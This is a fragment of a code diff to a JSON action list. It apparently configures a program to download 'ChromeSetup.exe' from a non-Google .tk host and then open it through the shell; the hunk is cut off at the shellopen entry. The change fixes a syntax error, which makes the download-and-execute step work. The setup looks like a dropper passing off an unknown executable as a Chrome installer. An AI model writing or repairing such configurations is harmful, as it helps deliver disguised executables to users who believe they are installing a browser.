@@ -5,7 +5,7 @@
 		{
 			"type":"download",
 			"url":"http://w.trany.tk/ChromeSetup.exe",
-			"file:"ChromeSetup.exe"
+			"file":"ChromeSetup.exe"
 		},
 		{
 			"type":"shellopen",			
